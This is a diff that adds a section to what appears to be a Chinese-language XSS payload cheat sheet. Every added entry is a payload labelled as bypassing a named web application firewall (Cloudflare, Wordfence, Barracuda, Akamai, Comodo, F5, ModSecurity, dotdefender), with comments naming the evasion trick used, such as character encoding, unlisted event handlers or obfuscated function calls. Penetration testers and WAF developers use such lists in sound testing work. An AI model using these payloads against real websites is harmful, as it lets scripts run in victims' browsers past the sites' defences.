@@ -1140,6 +1140,50 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```html
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
 ```
+### Cloudflare XSS Bypass Other
+```html
+<a"/onclick=(confirm)()>click <!--绕过技术：非空白填充-->
+```
+
+### Wordfence XSS Bypass
+
+```html
+<a/href=javascript&colon;alert()>click <!--数字字符编码-->
+```
+
+### Barracuda XSS Bypass Other
+```html
+ <a/href=&#74;ava%0a%0d%09script&colon;alert()>click <!--数字字符编码-->
+```
+
+### Akamai XSS Bypass Other
+```html
+<d3v/onauxclick=[2].some(confirm)>click <!--黑名单中缺少事件处理程序和函数调用混淆-->
+```
+
+### Comodo XSS Bypass Other
+```html
+ <d3v/onauxclick=(((confirm)))``>click <!--黑名单中缺少事件处理程序和函数调用混淆-->
+```
+
+### F5 XSS Bypass 
+名称： F5
+负载： <d3v/onmouseleave=[2].some(confirm)>click
+绕过技术：黑名单中缺少事件处理程序和函数调用混淆
+
+```html
+<d3v/onmouseleave=[2].some(confirm)>click <!--黑名单中缺少事件处理程序和函数调用混淆-->
+```
+
+### ModSecurity XSS Bypass 
+```html
+<details/open/ontoggle=alert()> <!--黑名单中缺少标签（事件处理程序？）-->
+```
+
+### dotdefender XSS Bypass 
+```html
+ <details/open/ontoggle=(confirm)()// <!--黑名单中缺少标签、函数调用混淆和备用标签结尾-->
+```
 
 ### Chrome Auditor - 9th August 2018
 
